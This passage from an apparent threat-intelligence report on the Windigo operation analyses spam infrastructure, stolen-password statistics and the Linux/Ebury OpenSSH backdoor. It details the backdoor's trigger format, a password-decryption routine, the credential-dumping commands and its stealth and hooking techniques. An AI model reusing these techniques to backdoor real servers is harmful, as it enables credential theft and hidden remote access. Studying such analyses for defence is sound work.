1,422\n\nNumber of passwords with special characters (non alpha numeric) 723\n\nMinimum password length 3\n\nMaximum password length 50\n\nMedian password length 10\n\nAverage number of characters in a password 11.1\n\nThe first thing that stands out when looking at the data is the average length, which is much longer\nthan we expected. The average length is 11.09 characters, a lot longer than the 7.63 characters average\n[found in the LulzSec leak, which was analyzed in 2011. This most likely reflects the fact that system](http://www.codelord.net/2011/06/18/statistics-of-62k-passwords/)\nadministrators are more conscious about the importance of strong passwords than the average\nInternet user.\n\n\n-----\n\nThe following histogram shows the distribution of password length:\n\n500\n\n400\n\n300\n\n200\n\n100\n\n0\n\n3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 25+\n\nFigure 3.11 Distribution of password length\n\nThe passwords that are used the most are well chosen and do not contain repeating patterns.\nSome of the passwords were seen several times, we suspect some network administrators reuse\nthe same password on different servers. For example, we saw successful logins from a single system\nto 10 different IP addresses, all located sequentially in the same sub-network with the same credentials.\n\nWith 33% of passwords containing at least one special character and an average length of more\nthan 11 characters, the passwords can be considered to be secure against brute force attempts.\n\n##### 3.8. Spam Analysis\n\nOne of the main items through which the operators of Windigo are monetizing infections\nis by sending spam email messages. Spam is sent using two different methods: servers infected\nwith Perl/Calfbot and end-user workstations infected with the Win32/Glupteba.M malware.\nThis section presents an analysis of the spam sent by the Perl/Calfbot instances only.\n\nFigure 3.12 Example of a ‘meetme’ spam\n\nWe used two different approaches to understand the volume and the type of spam sent via\nthe Perl/Calfbot infrastructure. The first approach consists of creating a fake bot that implements\nthe proper C&C network protocol. The second approach is to process the network traffic capture\nobtained in January 2014 on one of the Perl/Calfbot command and control reverse proxy server,\nand to extrapolate the results.\n\n\n-----\n\n###### 3.8.1. Fake Bot\n\nThe fake client was programmed based on the code described in the Perl/Calfbot section. This client\nis used to fetch spam jobs from the command and control server. Spam jobs consist of multiple email\ntemplates and a list of recipient email addresses.\n\nWe analyzed data from August 2013 until February 2014. During this period of time, our fake\nbot retrieved 13,422 different spam jobs targeting 20,683,814 unique email addresses. The following\nhistogram shows the top 10 domains that were the most targeted.\n\n\n0 2 MIL 4 MIL 6 MIL 8 MIL\n\n\n10 MIL\n\n10,746,948\n\n9,771,459\n\n\n1. GMAIL\n\n2. HOTMAIL\n\n3. YAHOO\n\n4. AOL\n\n5. LIVE\n\n6. MAIL\n\n7. MSN\n\n8. YMAIL\n\n9. ORANGE\n\n10. GOOGLEMAIL\n\n\nFigure 3.13 Volume of spam received by countries (based on TLDs)\n\nThe following map shows the distribution of top level domains that received the most spam messages\nfrom the Windigo operation. We can see that the top level domains that received the most spam\nmessages are France, United Kingdom and Russia.\n\n0 2,050,872\n\nFigure 3.14 Volume of spam received by countries (based on ccTLDs)\n\n\n-----\n\nTable 3.8 Top 5 of the most seen ccTLDs in email list\n\n\nPosition Country Count\n\n1 France 2,050,872\n\n2 United Kingdom 1,483,725\n\n3 Russia 854,580\n\n4 Germany 458,041\n\n5 Italy 333,204\n\nOthers 2,271,782\n\nTotal 7,452,204\n\nBy analyzing the content of the spam messages, we saw that there are a few recurring themes.\nMost of the spam templates contain references to casinos, bonuses, and online dating. Most of the spam\nmessages also contains words such as “unsubscribe” and “report”, in a probable attempt to evade\nspam detection. Following those links lead to a successful report /unsubscribe message. Although\nthey probably flag those submitting unsubscribe requests as known valid addresses.\n\nFigure 3.15 Unsubscribing from the mailing-list\n\nThe typical spam job targets around 3,000 email addresses and uses templates written\nin the English language, although we also observed French, German, Spanish and Russian. All spam\ntemplates contain URLs pointing to domains hosted on the TinyDNS infrastructure detailed later.\n\nFigure 3.16 Example of a ‘casino’ spam\n\n\n-----\n\n###### 3.8.2. Command and Control Traffic Analysis\n\nThe second technique used to assess the volume of spam sent was to analyze the network traffic\ncaptured on one of the command and control servers during the month of January 2014. We captured\n24-hour periods at weekly intervals over three weeks.\n\nThanks to the fact that Perl/Calfbot reports the number of spam messages successfully sent, we were\nable to witness that the infected servers reported a daily average of 35 million successfully sent spam\nmessages, the most prolific server reaching over a million spam messages in a single day.\n\nThe table below summarizes some statistics that we extracted from these data. Highlighted below\nis the notion of an active IP address which means an infected server that has reported at least once\nto the C&C that it has successfully sent spam.\n\n\nTable 3.9 Spamming efficiency\n\n\nActive IP addresses Spam sent\nDate IP addresses (% of total) (average per active IP)\n\nJan 7 1,442 244 (17 %) 27,713,339 (113,579)\n\nJan 14 483 300 (62 %) 32,793,722 (109,312)\n\nJan 24 877 490 (56 %) 46,402,673 (94,699)\n\nThe percentage of active IP addresses is somewhat low but several factors could explain this:\n[the server could have no mail submission agent (MSA) installed, it could have its outbound port](http://en.wikipedia.org/wiki/Mail_submission_agent)\n[25 blocked or it could have been blacklisted by a spam block list like Spamhaus’ (an outcome that](http://www.spamhaus.org/)\nis likely given that the server is actually sending spam).\n\nThis network traffic capture also allowed us to assess the number of servers infected with Perl/Calfbot.\nThe following map shows the number of IP addresses seen contacting the Perl/Calfbot command\nand control first layer reverse proxy server. During our observation periods, 2,215 unique IP addresses\nconnected to the proxy server. From those IP addresses, only 735 reported sending spam successfully.\nIn the figure, we can see that most of the servers are located in the United States, Germany and Russia.\n\n0 309\n\nFigure 3.17 Perl/Calfbot active infected servers per country\n\n\n-----\n\nTable 3.10 Top 5 countries sending spam via servers infected with Perl/Calfbot\n\n\nPosition Country Count\n\n1 United States 309\n\n2 Germany 72\n\n3 Russia 41\n\n**4** United Kingdom 32\n\n5 Turkey 23\n\nOthers 258\n\nTotal 735\n\nEvery week, around half of the IP addresses that reported sending spam successfully changed.\nSuch a churn can likely be explained by the blacklisting of the spamming IP addresses by antispam\nservices and the fact that the C&C drops the spambots that don’t report any successful spam sent\n(as we observed).\n\nThe first week we saw 244 unique active IP addresses, the second 300 addresses and the third\nweek 490. Between the first and second week, only 123 IP addresses were common. Between\nfirst and third week, only 89 of those. This is a very high IP churn rate which means that Perl/Calfbot\ncould have been running on several thousand different servers over the last year.\n\n###### 3.8.3. Command and Control Metadata\n\nThe traffic of the hosts infected by Perl/Calfbot yields other interesting data. For example, the C&C\nprotocol is sent over HTTP[2], allowing us to observe the various HTTP header information in addition\nto the malware-specific protocol information.\n\nUser-Agent Information\nAnalysing the User-Agent information we found out that the most prevalent strings are, without\nsurprises, from x86 and x64 Linux systems. We also observed User-Agent strings from OpenBSD,\nFreeBSD, OS X and Cygwin.\n\n### 19\nOS X\n\n### 61\n\nbsd\nwindows[2]\n\n### 241\n\nnot specified\n\n### 1,888\nlinux\n\nFigure 3.18 Perl/Calfbot operating system distribution\n\nIt is worth mentioning that at least two systems reporting to the command and control server were\nrunning the gnueabi version of the wget tool. This means these systems are using the GNU\nembedded application binary interface commonly used on the ARM architecture.\n\n\nSide Story\nARM systems are infected by Perl/Calfbot. Since Raspberry Pi is the most popular consumer embedded\nsystem, we like to think that some of them are sending tasty spam messages.\n\n\n2 Actually its HTTPS but we were able to decrypt it\n\n\n-----\n\nThe following is a list of interesting User-Agent strings found while monitoring the Perl/Calfbot\ncommand and control server.\n\nUsername Information\nThe username under which the malware is executed is reported to the C&C by Perl/Calfbot.\nWe display the most frequently encountered usernames below.\n\n\n**curl/7.21.4 (universal-apple-darwin11.0) libcurl/7.21.4 OpenSSL/0.9.8y zlib/1.2.5**\n**curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8y zlib/1.2.5**\n**curl/7.19.7 (universal-apple-darwin10.0) libcurl/7.19.7 OpenSSL/0.9.8l zlib/1.2.3**\n**curl/7.19.7 (universal-apple-darwin10.0) libcurl/7.19.7 OpenSSL/0.9.8r zlib/1.2.3**\n**curl/7.19.7 (universal-apple-darwin10.0) libcurl/7.19.7 OpenSSL/0.9.8y zlib/1.2.3**\n**Wget/1.12 (cygwin)**\n**Wget/1.12 (freebsd7.2)**\n**Wget/1.12 (freebsd7.4)**\n**Wget/1.12 (freebsd8.2)**\n**Wget/1.12 (linux-gnu)**\n**Wget/1.12 (linux-gnueabi)**\n**Wget/1.13.4 (cygwin)**\n**Wget/1.13.4 (darwin10.7.0)**\n**Wget/1.13.4 (freebsd8.1)**\n**Wget/1.13.4 (freebsd8.2)**\n**Wget/1.13.4 (freebsd8.3)**\n**Wget/1.13.4 (freebsd9.0)**\n**Wget/1.13.4 (linux-gnu)**\n**Wget/1.13.4 (openbsd5.2)**\n**Wget/1.14 (freebsd9.1)**\n**Wget/1.14 (linux-gnueabi)**\n**Wget/1.12 (linux-gnueabi)**\n\n\nFigure 3.19 Perl/Calfbot username distribution\n\nWebserver accounts (httpd, www, nobody, www-data and apache) are by far the most prevalent\naccount type running Perl/Calfbot. However this is only a fraction of the full username population\nwe encountered as highlighted by the large “other” section. This can be explained by the large\nvariety of usernames that were compromised through the credential stealing operation.\nAs we initially believed, only a small fraction of the malware is running with root privileges.\nWe think this strengthens the hypothesis that Perl/Calfbot is used to leverage stolen credentials\nfor accounts that don’t have elevated privileges, maximizing the usefulness of any credentials\n(root or not) that the operators have.\n\n\n-----\n\n##### 3.9. DNS Hosting Infrastructure\n\nWindigo operation employs domain names at various places, for example in spam campaigns, or as\nC&C servers’ contact points. We found out that the authoritative nameservers for these domains are\nhosted on Linux/Ebury infected servers running TinyDNS.\n\n[In July 2013 we were able to retrieve the database file from one TinyDNS server, containing configuration](http://tinydns.org/)\ndetails for 62,186 unique domain names. Such huge amount of domain names — all registered\nand paid for —, can be explained by the fact that they are used in spam emails, both in the sender\naddresses and in the actual spam URLs. Thus, a low level of reuse allows these domain names to\nkeep a medium to good reputation, effectively avoiding spam blacklists.\n\nBy correlating our data, we found out that spam is not the only part of Windigo operation relying\non this TinyDNS server, because it was also hosting:\n\n - The domain names generated dynamically by Perl/Calfbot to reach its command\nand control servers\n\n - The domain names generated dynamically by Linux/Ebury to exfiltrate credentials\n(only in version 1.2.1 and earlier)\n\n - The domain names for the multiple redirection layers in place to support the spam URLs\n\n[• The SPF, MX and A DNS records domain names (probably used to avoid](http://en.wikipedia.org/wiki/Sender_Policy_Framework)\nspam detection)\n\nHence, this TinyDNS database ties together various parts of Windigo operation, showing one more\ntime that the people behind all this are very likely the same.\n\n\nSide Story\nSome TinyDNS binaries and data were found by system administrators in /home/ ./root (yes, /\n**home/<space><dot>/root).**\n\n\n##### 3.10. Infected End Users\n\nDuring a September 2013 weekend, we captured the network traffic from a Linux/Cdorked frontend\nreverse proxy. While this capture was done only on one single proxy server — among the several\nused —, its analysis allowed us to gain an exclusive insight into the quantity and profile of users\nfalling victim to malicious redirections.\n\nThrough a single weekend, we observed more than 1.1 million different IP addresses going through\nthis server before being directed to exploit kit servers. As we will explain, only a fraction of these\nusers ultimately get infected.\n\n\n-----\n\nTo get an idea about these users’ profiles, we extracted from their HTTP User-Agent field – when\npossible – the name of their operating system, which gave us the following distribution:\n\n#### 8,081 7,726\nBlackberry Linux\n\n#### 24,997 4,821\nWindows Vista Windows Phone\n\n#### 35,135 49,676\n\nOS X Unknown\n\n#### 51,020\n\nWindows 8\n\n#### 182,329 364,224\nWindows XP Windows 7\n\n#### 225,596\niOS[202,711] Android\n\n#### 415 1,794\nWindows Server Other\n\n#### 334 238\nChrome OS Windows 8.1\n\nFigure 3.20 Linux/Cdorked redirection victims by operating system\n\nThe “Others” category contains various sub-versions of the main operating systems, whereas\nthe “Unknown” category contains the IP addresses for which we could not extract the operating\nsystem, mainly because it was not declared.\n\n\nScary Story\nWe were pretty horrified to notice that 23 people apparently still browse the Internet\non Windows 98, and one person even does it on Windows 95.\n\n\nMoreover, we extracted the browsers names contained in this same User-Agent field:\n\n### 82,015\nUnknown\n\n### 643\nOther\n\n### 32,097\nOpera\n\n### 120,958\nFirefox\n\n### 375,996\n 192,683   Safari\nMicrosoft Internet Explorer\n\n### 346,698\nChrome\n\nFigure 3.21 Linux/Cdorked Redirection Victims by Browser\n\n\nInterpreting User-Agent HTTP fields should be done cautiously, as a same IP address can be associated with\n[different User-Agent values, e.g. due to Network Address Translation, but also because the HTTP User-Agent](http://en.wikipedia.org/wiki/Network_address_translation)\n[field follows a loose format, making its processing non trivial.](http://tools.ietf.org/html/rfc2616%23section-14.43)\n\n\n-----\n\nWhen a user’s computer is redirected to a front-end reverse proxy, it starts a series of back-and-forth\ncommunications with the exploit kit server, which stays comfortably hidden behind the chain\nof reverse proxies. At the end of this dialog, the user’s machine will be infected with some malware\nif it is vulnerable to an exploit supported by the kit.\n\nThe infamous Blackhole kit was used by Windigo operators at the time of our capture, allowing\nthem to target Windows users. In October 2013, the operators switched to the Neutrino exploit kit\nafter the arrest of the alleged author of Blackhole. Detailed technical analyses of the inner workings\n[of the Blackhole kit are already available in the existing](http://www.sophos.com/en-us/medialibrary/PDFs/technical%2520papers/sophosblackholeexploitkit.pdf) [literature, as well as for Neutrino.](http://www.welivesecurity.com/category/blackhole/)\n\nThe final malicious payload distributed by Blackhole being unencrypted, we were able to count\nthe number of successfully exploited users who were actually served a malicious binary executable.\nOut of the 1.1 million visitors, 11,108 were successfully exploited, which gives a 1% infection ratio.\nWhile the ratio might seem low, 10,000 is still a significant number of new infections, especially\nconsidering this number comes from a single front-end server over two days only.\n\nWe observed two distinct malware families distributed by the exploit kit. Users coming from the USA,\nUK, Canada and Australia were infected with Win32/Boaxxe.G, whereas others were infected\nwith Win32/Leechole, a simple dropper that then installed Win32/Glupteba.M. This specific malware\ndistribution has been constant since we started tracking the Windigo operation. We will discuss\nWin32/Boaxxe.G — an infamous click fraud malware — in more details here, and Win32/Glupteba.M\n— a spam proxy — there.\n\n\nSide Story\nCertain security companies repeatedly used their corporate IP address space to visit the front- end\nserver we monitored. They did not receive any payloads, likely because their IP addresses were already\nblocked by Windigo operators.\n\n\n-----\n\n### 4. LINUX/EBURY\n\nLinux/Ebury is a malware that provides a root backdoor shell and credential stealing capabilities.\nIt is the core component of the Windigo operation and is present on every host on which the Windigo\noperators obtained root credentials.\n\nThis section describes the technical details of the Linux/Ebury family. We start by describing\nthe different features present in the backdoor and their evolution over time. The persistence\nand stealth techniques used by the two existing Linux/Ebury variants will then be explained, followed by\nthe details on how an operator can interact with the backdoor. Finally, a complete technical analysis\nof the inner workings of the backdoor will be presented.\n\n##### 4.1. Features\n\n###### 4.1.1. Credentials Stealer\n\nThe main purpose of Linux/Ebury is to steal credentials by intercepting them at multiple locations\nwhen they are typed or used by the victim. This feature is used by the Windigo operators to spread\ntheir infection to new servers.\n\n###### 4.1.2. OpenSSH Backdoor\n\nThe operators maintain control on theinfected servers by installing a backdoor in the OpenSSH\ninstance. The backdoor provides them with a remote root shell even if local credentials are changed\non the infected host.\n\n###### 4.1.3. Stealth\n\nBackdooring OpenSSH is not an easy task. To maintain control over compromised servers over\nthe long term, this had to be done in a very stealthy fashion.\n\nIn fact, the authors careful to:\n\n - Use Unix pipes as much as possible when deploying their backdoor to avoid landing files\non the filesystem\n\n - Leave no trace in log files when using the backdoor\n\n - Change original signatures in the package manager for the modified file\n\n - Avoid exfiltrating information when a network interface is in promiscuous mode\n\n - Use POSIX shared memory segments with random system user owners to store stolen credentials\n\n - Inject code at runtime into three OpenSSH binaries instead of modifying the original OpenSSH\nfiles on disk\n\n - Change OpenSSH daemon configuration in memory instead of on disk\n\n - Centralize their backdoor in a library instead of an executable (libkeyutils.so)\n\n##### 4.2. Changelog\n\nThe authors of Linux/Ebury have a good practice of leaving version numbers inside their binaries.\nThis allows operators to know what version is installed on each system. It also helps researchers\nunderstand the chronology of events and sort samples more easily.\n\n\n-----\n\nThe first versions of the backdoor are based on a patch applied to sshd, ssh and ssh-add binaries.\nVersions 1.0 and above implement a patched libkeyutils.so library.\n\n\nTable 4.1 Patched binaries Linux/Ebury variant changelog\n\n\nVersion Comments\n\n0.4.4 Earliest version we’ve seen\n\n…\n\n0.7.4 Changed obfuscation technique\n\n0.8.0 New DGA introduced, Backdoor password is now\nstored in SHA-1 hashes instead of cleartext\n\n…\n\n\nTable 4.2 **libkeyutils.so Linux/Ebury variant changelog**\n\n\nVersion Comments\n\n…\n\n1.1.0 Earliest version we’ve seen, released\non December 26, 2012\n\n…\n\n1.2.1 Last version seen with the old DGA\n\n… New DGA introduced\n\n1.3.1 Backdoor password is now stored in SHA-1 hashes\ninstead of cleartext, first version seen with the new DGA\n\n1.3.2 Won’t send stolen credentials when an interface\nis in promiscuous mode\n\n1.3.3b 1.3.3 – beta\n\n1.3.3 Supports new OpenSSH builds\n\n1.3.4b1 1.3.4 – beta 1\n\n1.3.4b2 1.3.4 – beta 2\n\n1.3.5 Released on February 19 2014\n\n##### 4.3. Persistence\n\nThe two Linux/Ebury variants use different techniques to gain persistence on an infected system\nwhile maintaining a high level of stealthiness. System administrators attempting to clean systems\nthat are part of the Windigo operation are usually able to remove other malware components such\nas Linux/Cdorked, but often overlook the OpenSSH backdoor due to the stealth mechanisms used.\nThus, it was common for the operators to come back a few days later and revert the changes made\nby the administrator.\n\n###### 4.3.1. Patched OpenSSH Variant\n\nThe first variant we found was in the form of modified binaries present on disk. The three affected\nfiles are ssh, sshd and ssh-add. We have seen versions ranging from 0.4.4 up to 0.8.0 being used.\n\nTo allow compatibility and avoid linking problems, the new binaries are compiled on the compromised\nserver. We have then witnessed infected systems which were not running the Linux kernel; FreeBSD\nfor instance. Furthermore, the files’ timestamp are then modified so as not to raise suspicion that\nthe file changed.\n\n\n-----\n\n###### 4.3.2. Patched libkeyutils.so Variant\n\nThe libkeyutils variant does not modify the OpenSSH files directly. Instead, it modifies a shared\nlibrary against which all OpenSSH executable files are dynamically linked. The resulting alteration\nof the OpenSSH files is the same as the first variant, the only difference is the hooks and code patches\napplied at run time. The shared library modified on the system is libkeyutils.so. It’s usual size\nis around 10KB. Linux/Ebury adds an additional 20KB of malicious code, making an infected library\napproximately 30KB in size.\n\nAlthough placing malicious code inside shared libraries has already been seen before on the Windows\nplatform, it is the first time we have seen this technique on the Linux operating system.\n\n[To enable the different features of the malware, a constructor function was added to the original](http://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html%23index-g_t_0040code_007bconstructor_007d-function-attribute-2825)\n**libkeyutils.so. This constructor is automatically called whenever the library is loaded by any**\nexecutable. The malicious code first verifies which executable is loading the library. If it is any of the\nOpenSSH executables, the malicious patches and function hooks are applied to the original code.\n\n##### 4.4. Interacting with the Backdoor\n\n###### 4.4.1. Connecting to the Backdoor\n\nThe backdoor functionality consists of totally bypassing the regular password validation built into\nthe non-trojanized sshd, allowing the operator to connect to the compromised system as any existing\nuser, including root.\n\nTo trigger this backdoor functionality, the connecting client must supply the 11-character backdoor\naccess password that is hardcoded in the backdoor binary at compile-time in a specially crafted SSH\nprotocol version identification string during the SSH handshake.\n\nHere is the official descripion of this version element from the SSH specification:\n\nAfter the socket is opened, the server sends an identification string, which is of the form “SSH<protocolmajor>.<protocolminor>-<version>\\n”, where <protocolmajor> and protocolminor>\n# « are integers and specify the protocol version number (not software distribution version).\n<version> is server side software version string (max 40 characters); it is not interpreted\nby the remote side but may be useful for debugging.\n# »\n\n– T. Ylonen\n_http://www.openssh.com/txt/ssh-rfc-v1.5.txt_\n\n\nThe client version string must first be encrypted with the operator’s IP address and then hexadecimalencoded. The usual version strings have the following format:\n\n\n**0x00 BYTE[11] backdoor password**\n**0x0F BYTE[4]** **optional command (`Xcat`, `Xbnd` or `Xver`)**\n**0x13 BYTE[4]** **optional command argument (ip address)**\n\n\nAn example SSH protocol version used to trigger the backdoor functionality looks like this:\n\n\n**SSH-2.0-fb54c28ba102cd73c1fe43**\n\n\nSince the protocol version identification is sent before the SSH encryption handshake is performed,\nit is possible to detect backdoor connection activity at the network level.\n\n\n-----\n\nHere is a pseudo-C implementation of the access password decryption algorithm.\n\nIt is worth mentioning that this encryption method is exactly the same as the one used by Linux/\nCdorked to encrypt its configuration commands. This is the first of many discoveries that tipped\n\n\n**void decrypt_string(char *encrypted_string, char *decrypted_string, char**\n***client_ip)**\n**{**\n**char hexbyte [3] = {0};**\n**char xorkey [4] = {0};**\n**int i;**\n\n**inet_aton(client_ip, xorkey);**\n\n**xorkey [0] = (char) (xorkey [0] + 5) & 0xff;**\n**xorkey [1] = (char) (xorkey [1] + 33) & 0xff;**\n**xorkey [2] = (char) (xorkey [2] + 55) & 0xff;**\n**xorkey [3] = (char) (xorkey [3] + 78) & 0xff;**\n\n**for(i = 0; i < strlen(encrypted_string) / 2; i++) {**\n**char byte;**\n**strncpy(hexbyte, encrypted_string [i * 2], 2);**\n**sscanf(hexbyte,”%x”,&byte);**\n**decrypted_string [i] = byte ^ xorkey [i % 4] ;**\n**}**\n\n**decrypted_string [i] = ‘\\0’;**\n**}**\n\n\nus off about the connection between Linux/Ebury and Linux/Cdorked analyzed earlier in 2013.\n\nTo ensure the proper behavior, the backdoor enables the sshd configuration parameters\n**PermitRootLogin, PasswordAuthentication and PermitEmptyPassword.**\n\nAll connections made via the backdoor are also explicitly excluded from the messages sent\nto the system’s logging facility.\n\nStarting from version 1.3.2, the plaintext access password used in the version string was replaced\nby a SHA-1 hash. This improved the security of the backdoor by preventing discovering the access\npassword by static analysis. The only practical way of inferring the access password would\nbe to analyze a network traffic capture of a successful connection made to the backdoor.\n\nFigure 4.1 Linux/Ebury backdoor password now hashed\n\n\n-----\n\nSide Story\nThe malware authors decided to improve their security practices. They changed their password storage\nby keeping a SHA-1 hash of the hardcoded password in the backdoor instead of storing it in plaintext.\n\n\n###### 4.4.2. Commands\n\nAside from providing a shell, the backdoor offers three commands to ease the management\nof the compromised server. To call one of these commands, its short name must be appended\nto the backdoor password in the version string previously described. Here is a description\nof each command:\n\n\nTable 4.3 Linux/Ebury backdoor commands\n\n\nCommand Functionality\n\n**Xcat** Retrieve all the passwords, passphrases and keys stolen.\n\n**Xver [ip_address]** Retrieve the installed Linux/Ebury version string.\n\n**Xver also accepts an optional ip_address argument. If present, it will set**\nthe exfiltration server IP address.\n\n**Xbnd ip_address** [Ask sshd to bind(2) the client socket to the specified interface ip_address](http://man7.org/linux/man-pages/man2/bind.2.html)\nwhen creating a SSH tunnel.\n\nAlthough we haven’t witnessed its usage, we believe the Xbnd command is used when the attackers\nuse SSH tunnels to send spam. When a server has multiple public IP addresses, it is possible to use\nan alternate IP address on the server when one is blacklisted.\n\nUsing Commands Locally\n\nIt is possible to run backdoor commands without creating a custom SSH client to allow sending\nof arbitrary version identification strings. One can use an infected ssh binary and the -G switch:\nsupply the hexadecimal-encoded string of the backdoor password and the command name\nencrypted with IP address 0.0.0.0 as the argument. Only the Xcat and Xver commands\nare supported in this mode. We can also use this technique to find out if a server is infected.\nPlease refer to the IOC section for more information.\n\n##### 4.5. Internals\n\n###### 4.5.1. Deployment\n\nIn Linux/Ebury prior to version 1.0.0, the Windigo operators used wget to download the OpenSSH\nsource code and apply a patch specific to the exact version of the OpenSSH instance running\non the server, before recompiling and replacing the original binaries (sshd, ssh and ssh-agent).\n\nThis deployment technique was probably not stealthy enough. They found a clever trick: deploying\na modified library used by those binaries. That’s how the libkeyutils.so patch was born. Instead\nof recompiling the library on the server, they maintain a set of precompiled libraries for different\nLinux distributions.\n\nWe have seen a common pattern when the libkeyutils is deployed on servers. The operators will first\nadd a new file alongside the original libkeyutils.so. Common patterns for this new filename\nare wrong versioning, like libkeyutils.so .1.9 (a version that doesn’t exist), or appending\n**.0 to the filename of the libkeyutils library currently in use. They will then update the original**\nsymbolic link to point to the malicious file.\n\nIf a system administrator discovers this trick and removes the malicious file, the Windigo operators\nwill attempt to reconnect to the server using either stolen credentials. If they succeed, they will\nuse a second infection technique.\n\nInstead of adding a new file and using a symlink, they will replace the original libkeyutils.so\nlibrary outright, potentially luring the system administrator into thinking the server is still clean.\n\n\n-----\n\nWe have also seen usage of rpm commands to remove signatures from the original OpenSSH\npackages (openssh-server, openssh-clients) and to update the file hashes straight in the RPM\ndatabase. This improved stealthiness by preventing system administrators from noticing the file\nmodifications when issuing the usual rpm --verify openssh-servers command. However,\nrunning rpm -qi openssh-servers would clearly indicate that the package signatures are\nmissing, which should be considered suspicious.\n\n###### 4.5.2. Basic Obfuscation\n\nStrings are deobfuscated on library load with a static 8 byte XOR key. Versions prior to 1.3.1 used\na single byte XOR key instead. After unpacking, a series of dlsym will load various functions required\nfor Linux/Ebury to operate such as PEM_write_RSAPrivateKey, sysconf, shmget, shmat,\n**socket and 32 others.**\n\n###### 4.5.3. Loading Executable Detection\n\nAs previously explained, when loaded, the malicious libkeyutils.so shared library first determines\nwhich executable file it is being loaded from in order to determine if it is one of the OpenSSH binaries.\nThis is achieved by inspecting the available symbols in the parent binary’s import and export table.\n\nHere are the symbols looked for by Linux/Ebury for the three OpenSSH binaries:\n\n\nTable 4.4 Symbols looked for by Linux/Ebury for the three OpenSSH binaries\n\n\nSymbol Name Type ssh sshd ssh-agent\n\n**hosts_access** import no yes no\n\n**pam_authenticate** import no yes no\n\n**execvp** import yes no no\n\n**SECKEY_ConvertTo** import no no no\n**PublicKey**\n\n**options** export yes yes no\n\n**hastaddr** export yes no no\n\n**idtable** export no no yes\n\n_• Based on Debian’s OpenSSH version 6.0p1-4 binary packages_\n\nLinux/Ebury attempts to match as many build versions as possible by using heuristics.\nFor example, Linux/Ebury will determine that the parent process is ssh-agent if only the options\nand idtable presence match the above table.\n\n\n-----\n\n###### 4.5.4. Hooked Functions\n\nTo perform its malicious activity, libkeyutils.so hooks some specific functions inside the target\nOpenSSH binary. To do so, it attempts to discover the binary’s executable address space by calling\n**dlopen (NULL, RTLD_NOW) and passing the returned handle to dlinfo (handle, RTLD_DI_LINKMAP,...).**\nThis provides the ability to walk the import table of the ELF executable and replace any imported\nfunction’s addresses in memory.\n\nThe most interesting application of this technique is seen when the sshd process gets modified.\n\nThe following functions are hooked:\n\n\n**hosts_access**\n**syslog_chk**\n**audit_log_user_message**\n**audit_log_acct_message**\n**connect**\n**write**\n**syslog**\n**popen**\n**crypt**\n**pam_start**\n\n\nThe logging functions are hooked to select which messages should be relayed to the logging facility\nand which should be hidden. Messages triggered by non-malicious sshd activity will be handled\nby the original logging function, while the other messages, such as a successful connection made\nby triggering the password authentication bypass, will be suppressed.\n\nThe connect() function is hooked so that when the Xbnd command is used, the source IP address\ncan be set via a call to bind() before the actual call to connect() is performed.\n\nThe other function such as pam_start() and crypt() are used to get the password used\nto authenticate. Interestingly, the pam_start() hook will place an additional hook on pam_\n**authenticate() to steal the password.**\n\n###### 4.5.5. Runtime Code Patches\n\nTo hook functions that are not imported, Linux/Ebury will modify the in-memory code segment\nby patching specific call instructions to point to its own implementation. The following figure\nshows an example where the ssh program call to key_parse_private_pem() is redirected\nto a malicious function. IDA marks the address in red because it is in the libkeyutils.so address\nspace. The malicious function first calls the original implementation and then logs the private key\nin memory for future exfiltratation.\n\nFigure 4.3 Patched call inscruption in ssh\n\n\n-----\n\nBy default, the code segment to be modified is not writable, so trying to patch it will fail and crash\nthe program. Linux/Ebury adds the write permission by calling mprotect(), patches the segment\nand carefully removes the write permission afterwards to avoid suspicion.\n\nBefore attempting to modify the code segment, Linux/Ebury carefully registers a signal handler\nto intercept any segmentation fault it may cause during the code injection. More specifically,\nthe handler will be called if the process receives a SIGSEGV or SIGBUS signal. In the case such signal\nis caught, Linux/Ebury will simply abort its task and let OpenSSH do its legitimate behavior.\nThe handler is then removed whether the code injection was successful or not.\n\nThe way Linux/Ebury recovers from a segmentation fault is interesting. Before doing something\nthat could potentially crash the process, sigsetjmp() is called to create a snapshot of the current\nstate. Then, if an access violation happens, siglongjmp() is used in the signal handler to restore\nto the previous state.\n\nThis code patching technique is limited because offsets of code to patch are hardcoded inside\n**libkeyutils.so. Typically each libkeyutils.so variant will work for 3 to 5 different OpenSSH**\nbuilds from a specific Linux distribution.\n\n###### 4.5.6. Usage of Shared Memory Segments\n\nLinux/Ebury uses POSIX shared memory Segments (shm) in order to store stolen data.\n\nThree shared memory Segments are created when needed, using random owners and 0666 permission.\n\n\nTable 4.5 Linux/Ebury shared memory segments\n\n\nShared\nmemory Segments Encrypted Used for\n\nControl part No Storing exfiltration server and an index\nfor data segments\n\nData part 1 Yes Valid credentials\n\nData part 2 Yes All username/password based credentials, valid or not\n\nThe data parts are encrypted using a key that is based on 3 elements:\n\n1. hardcoded version key in the shared library\n\n2. system information and host id, based on uname() and gethostid() results\n\n3. entry count in the segment\n\nIn addition, single values added to the data segment SHMs are XOR encrypted using a 4 bytes static key.\n\nThis key generation process makes it difficult to decrypt memory segment dumps from infected\nhosts unless the proper host characteristics are known.\n\nThe presence of shared memory segments on a server can be an indicator of infection. Please refer\nto the IOC section for more information.\n\n###### Control Segment\n\nThe control segment is used to store configuration information such as the IP address of the exfiltration\nserver and the timestamp of when the information was added to the segment.\n\nThe segment is organized in this way:\n\n\n**0x00 exfiltration server node**\n**0x10 data index header**\n**0x18 data index * MAX_INDEX**\n\n\n-----\n\nExfiltration Server Node C Structure\n\n\n**struct exfiltration_server_node {**\n**unsigned int ip_address; // Exfiltration server ip address**\n**time_t added_time;** **// Timestamp when it was added**\n**unsigned int next_node;** **// Next exfiltration entry**\n**unsigned int max_node;** **// Max number of exfiltration entries**\n**}**\n\n\nAlthough the exfiltration server information is stored in a linked list, we do not have more than\none entry at the same time.\n\nData Index Header C Structure\n\n\n**struct data_index_header {**\n**unsigned int count;** **// How many entries in the index**\n**unsigned int offset;** **// Offset in the memory segment for the first index**\n**}**\n\n\nData Index C Structure\n\n\n**struct data_index {**\n**unsigned int offset;** **// Offset in the memory segment of this entry**\n**unsigned int length;** **// Length of the entry**\n**unsigned int id;** **// Identifier of the entry**\n**}**\n\n\n###### Data Segments\n\nThe Data segment 1 stores valid stolen credentials such as private keys, username/password\ncombinations, IP addresses, etc.\n\nThe Data segment 2 stores both valid and invalid credentials used for every login attempt,\nthus catching a lot of noise such as bruteforce SSH login attempts.\n\n###### 